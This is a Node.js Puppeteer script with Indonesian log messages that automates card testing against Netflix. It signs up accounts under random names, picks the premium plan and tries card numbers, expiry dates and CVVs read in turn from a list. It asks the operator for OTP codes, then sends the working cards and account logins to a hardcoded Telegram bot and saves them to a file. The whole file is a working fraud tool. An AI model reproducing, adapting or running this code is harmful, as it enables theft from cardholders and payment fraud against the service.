const readlineSync = require('readline-sync');
const puppeteer = require('puppeteer-extra');
var random_name = require('node-random-name');
const fs = require('fs');
const delay = require('delay');
const S = require('string');
const { error, Console } = require('console');
const { type } = require('os');
var no = 1;
var moment = require("moment");
var figlet = require('figlet');
var chalk = require('chalk');
var fetch = require('node-fetch');
var request = require('request');

domain = "@haikak.my.id";
(async () => {
    var i = 1;
    var aww = readlineSync.question('List CreditCard : ');
    console.log('\n')
    const read = fs.readFileSync(aww, 'UTF-8');
    const list = read.split(/\r?\n/);

    while (true) {
        var pay = i + 5;
        var name1 = random_name({ first: true });
        var name2 = random_name({ last: true });
        var fullname = name1 + name2;
        var emailAcc = fullname + nope(5) + domain;
        const $options = { waitUntil: 'networkidle2' };
        const browser = await puppeteer.launch({ headless: true });
        const page = await browser.newPage();

        await page.goto('https://www.netflix.com/id-en/', $options);

        await page.waitForSelector('input[type=email]')
        const emailField = await page.$('input[type=email]')
        await emailField.type(emailAcc)
        await emailField.dispose()

        console.log('[' + no + ']' + 'Login Dengan Email ', emailAcc);
        no++;
        await page.waitForSelector('span.cta-btn-txt')
        const buttonClick = await page.$('span.cta-btn-txt')
        await buttonClick.click()
        await buttonClick.dispose()

        await delay(5000)
        if (page.url().includes('https://www.netflix.com/signup/registration')) {

            await page.waitForSelector('button[type=button]')
            const submitEar = await page.$('button[type=button]')
            await submitEar.click()
            await submitEar.dispose()

            await delay(3000)
            const password = await page.$('input[type=password]')
            await password.type('Alfarz123!')
            await password.dispose()


            await delay(3000)
            const submit = await page.$('button[type=submit]')
            await submit.click()
            await submit.dispose()

            await delay(3000)


            if (page.url().includes('https://www.netflix.com/signup/regform')) {
                const notice = await page.evaluate(() => {
                    return document.querySelector('div[data-uia="UIMessage-content"]').innerText;
                })
                console.log(notice);
                console.log('   [', moment().format('lll'), '] Menunggu 45 menit');
                await delay(2700000)
                continue;
            } else if (page.url().includes('https://www.netflix.com/signup/password')) {
                const notice = await page.evaluate(() => {
                    return document.querySelector('div[data-uia="UIMessage-content"]').innerText;
                })
                console.log('  ', notice, '\n');
                continue;
            }

            console.log('   Berhasil Mengisi Form Email Dan Form Password');

            await delay(2000)
            const awwComder = await page.$('div.submitBtnContainer')
            await awwComder.click()
            await awwComder.dispose()

            await delay(3000)

            const planType = await page.$('input[value="114120"]')
            await planType.click()
            await planType.dispose()

            const submitPlan = await page.$('div.submitBtnContainer')
            await submitPlan.click()
            await submitPlan.dispose()

            try {
                await page.waitForSelector('#appMountPoint > div > div > div.simpleContainer > div > div.nfmodal.interstitialModal > div > footer > div > button')
                var nonindo = await page.$('#appMountPoint > div > div > div.simpleContainer > div > div.nfmodal.interstitialModal > div > footer > div > button')
                await nonindo.click()
            } catch (err) {

            }
            await delay(3000)
            if (page.url().includes('https://www.netflix.com/signup/password')) {
                const rePassword = await page.$('input[type=password]')
                await rePassword.type('Alfarz123!')
                await rePassword.dispose()

                await delay(2000)

                const submit = await page.$('button[type=submit]')
                await submit.click()
                await submit.dispose()

                console.log('   Akun Tidak Bisa Dipakai Karena Terdaftar')
                continue;
            }

            console.log('   Berhasil Memilih Plan Premium');

            await delay(2000)

            const creditCard = await page.$('div.mopNameAndLogos')
            await creditCard.click()
            await creditCard.dispose()

            await delay(3000)
            const agree = await page.$('label[for=cb_hasAcceptedTermsOfUse]')
            await agree.click()
            await agree.dispose()

            console.log('   Sedang Memasukan Kartu Kredit Dan Proses Pay')
            for (i; i < pay; i++) {
                var cardnum = list[i].split('|')[0];
                var cardmonth = list[i].split('|')[1];
                var cardyear = list[i].split('|')[2];
                var cardcvv = list[i].split('|')[3];

                await delay(3000)
                const firstName = await page.$('input[data-uia=field-firstName]')
                await page.focus('input[data-uia=field-firstName]');
                await page.keyboard.down('Control');
                await page.keyboard.press('A');
                await page.keyboard.up('Control');
                await page.keyboard.press('Backspace');
                await firstName.type('Apri')
                await firstName.dispose()

                const lastName = await page.$('input[data-uia=field-lastName]')
                await page.focus('input[data-uia=field-lastName]');
                await page.keyboard.down('Control');
                await page.keyboard.press('A');
                await page.keyboard.up('Control');
                await page.keyboard.press('Backspace');
                await lastName.type('Amsyah')
                await lastName.dispose()

                const cardNumber = await page.$('input[data-uia=field-creditCardNumber]')
                await page.focus('input[data-uia=field-creditCardNumber]');
                await page.keyboard.down('Control');
                await page.keyboard.press('A');
                await page.keyboard.up('Control');
                await page.keyboard.press('Backspace');
                await cardNumber.type(cardnum)
                await cardNumber.dispose()

                await delay(1000)

                const cardExpire = await page.$('input[data-uia=field-creditExpirationMonth]')
                await page.focus('input[data-uia=field-creditExpirationMonth]');
                await page.keyboard.down('Control');
                await page.keyboard.press('A');
                await page.keyboard.up('Control');
                await page.keyboard.press('Backspace');
                await cardExpire.type(cardmonth + cardyear)
                await cardExpire.dispose()

                const cardCVV = await page.$('input[data-uia=field-creditCardSecurityCode]')
                await page.focus('input[data-uia=field-creditCardSecurityCode]');
                await page.keyboard.down('Control');
                await page.keyboard.press('A');
                await page.keyboard.up('Control');
                await page.keyboard.press('Backspace');
                await cardCVV.type(cardcvv)
                await cardCVV.dispose()

                const buttonPay = await page.$('#appMountPoint > div > div > div.simpleContainer > div > form > div.submitBtnContainer > button')
                await buttonPay.click()
                await buttonPay.dispose()
                await delay(8000)
                if (page.url().includes('otpPhoneEntry')) {
                    i = i;
                    var nohp = readlineSync.question('   Input Nomor HP +62 : ');

                    const otpNumber = await page.$('input[data-uia=field-mobilePhone]')
                    await otpNumber.type(nohp)
                    await otpNumber.dispose()

                    const buttonOtp = await page.$('button[type=button]')
                    await buttonOtp.click()
                    await buttonOtp.dispose()

                    await delay(10000)
                    if (page.url().includes('otpPhoneEntry')) {
                        i = i;
                        const info = await page.evaluate(() => {
                            return document.querySelector('div[class=messageContainer').innerText;
                        })

                        console.log('', info);
                        break;
                    } else {
                        i = i;

                        var code = readlineSync.question('   OTP Code : ');

                        const otpCode = await page.$('input[data-uia=field-signupOtpCode]')
                        await otpCode.type(code)
                        await otpCode.dispose()

                        const buttonCode = await page.$('button[type=button]')
                        await buttonCode.click()
                        await otpCode.dispose()
                    }
                    await delay(1000)

                    if (page.url().includes('orderfinal')) {
                        i = i;

                        console.log('  ', cardnum + '|' + cardmonth + '|' + cardyear + '|' + cardcvv, 'Information : Sukses Pay');
                        const log = await fetch('https://api.telegram.org/bot1765772940:AAEhqTFxRZajrd5WRD7L7bbuTuxVZk8RQ-Q/sendMessage?chat_id=-562763192&text='+emailAcc+'|Alfarz123!|'+cardnum+'|'+cardmonth+'|'+cardyear+'|'+cardcvv+'', {
    method: 'GET',
})

.then(async res => {
    const data = await res.json()
    return data
})
                        fs.appendFileSync("netflixpremium.txt", emailAcc + '+Alfarz123!+' + cardnum + '|' + cardmonth + '|' + cardyear + '|' + cardcvv + '\n');
                        console.log('\n');
                        break;
                    } else if (page.url().includes('otpCodeEntry')) {
                        i = i;

                        await delay(5000)
                        if (page.url().includes('orderfinal')) {
                        i = i;

                            console.log('  ', cardnum + '|' + cardmonth + '|' + cardyear + '|' + cardcvv, 'Information : Sukses Pay');
                            const log = await fetch('https://api.telegram.org/bot1765772940:AAEhqTFxRZajrd5WRD7L7bbuTuxVZk8RQ-Q/sendMessage?chat_id=-562763192&text='+emailAcc+'|Alfarz123!|'+cardnum+'|'+cardmonth+'|'+cardyear+'|'+cardcvv+'', {
    method: 'GET',
})

.then(async res => {
    const data = await res.json()
    return data
})
                            fs.appendFileSync("netflixpremium.txt", emailAcc + '+Alfarz123!+' + cardnum + '|' + cardmonth + '|' + cardyear + '|' + cardcvv + '\n');
                            console.log('\n');
                            break;
                        } else if (page.url().includes('otpCodeEntry')) {
                        i = i;

                            await delay(5000)
                            const info = await page.evaluate(() => {
                                return document.querySelector('div[class=messageContainer').innerText;
                            })

                            console.log('  ', cardnum + '|' + cardmonth + '|' + cardyear + '|' + cardcvv, '', info);
                            break;
                        }
                    }
                } else if (page.url().includes('creditoption')) {
                    i = i;
                    const results = await page.evaluate(() => {
                        return document.querySelector('div[data-uia=UIMessage-content]').innerText;
                    })
                    console.log('  ', cardnum + '|' + cardmonth + '|' + cardyear + '|' + cardcvv, 'Information : ', results);
                    continue;
                } else if (page.url().includes('verifyCardContext')) {
                    i = i;
                    
                    console.log('  ', cardnum + '|' + cardmonth + '|' + cardyear + '|' + cardcvv, 'Information : VBV GOBLOG');
                    break;
                } else if (page.url().includes('orderfinal')) {
                    i = i;
                    console.log('  ', cardnum + '|' + cardmonth + '|' + cardyear + '|' + cardcvv, 'Information : Sukses Pay');
                    const log = await fetch('https://api.telegram.org/bot1765772940:AAEhqTFxRZajrd5WRD7L7bbuTuxVZk8RQ-Q/sendMessage?chat_id=-562763192&text='+emailAcc+'|Alfarz123!|'+cardnum+'|'+cardmonth+'|'+cardyear+'|'+cardcvv+'', {
    method: 'GET',
})

.then(async res => {
    const data = await res.json()
    return data
})
                    fs.appendFileSync("netflixpremium.txt", emailAcc + '+Alfarz123!+' + cardnum + '|' + cardmonth + '|' + cardyear + '|' + cardcvv + '\n');
                    break;
                } else {
                    i = i;
                    console.log('  ', cardnum + '|' + cardmonth + '|' + cardyear + '|' + cardcvv, 'Information : Apanih');
                    fs.appendFileSync("netflixapanih.txt", emailAcc + '+Alfarz123!+' + cardnum + '|' + cardmonth + '|' + cardyear + '|' + cardcvv + '\n');
                    continue;
                }
                await browser.close()
            }
        }
    }
})();
function nope(length) {
    var result = '';
    var characters = '12314567890';
    var charactersLength = characters.length;
    for (var i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function calculateDays(startDate, endDate) {
    var start_date = moment(startDate, 'YYYY-MM-DD HH:mm:ss');
    var end_date = moment(endDate, 'YYYY-MM-DD HH:mm:ss');
    var duration = moment.duration(end_date.diff(start_date));
    var days = duration.asDays();
    return days;
}